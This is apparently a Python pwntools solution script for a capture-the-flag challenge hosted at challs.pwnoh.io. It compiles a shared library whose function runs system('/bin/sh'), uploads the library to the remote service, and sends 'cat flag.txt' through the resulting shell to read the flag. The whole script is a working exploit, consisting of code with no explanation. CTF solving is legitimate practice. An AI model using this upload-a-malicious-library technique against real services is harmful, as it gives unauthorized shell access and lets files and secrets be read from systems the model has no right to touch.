import subprocess

from pwn import remote

src = b"""
#include <stdlib.h>
void thank() {
    system("/bin/sh");
}
"""

subprocess.run(['gcc', '-xc', '-shared', '-o', 'thank.so', '-'], input=src, check=True)

with open('thank.so', 'rb') as f:
    so_contents = f.read()

r = remote("challs.pwnoh.io", 13373)


r.sendlineafter(b'in bytes', str(len(so_contents)).encode())

r.sendafter(b'file!', so_contents)

r.sendline(b'cat flag.txt && exit')

print(r.recvall().strip().decode())
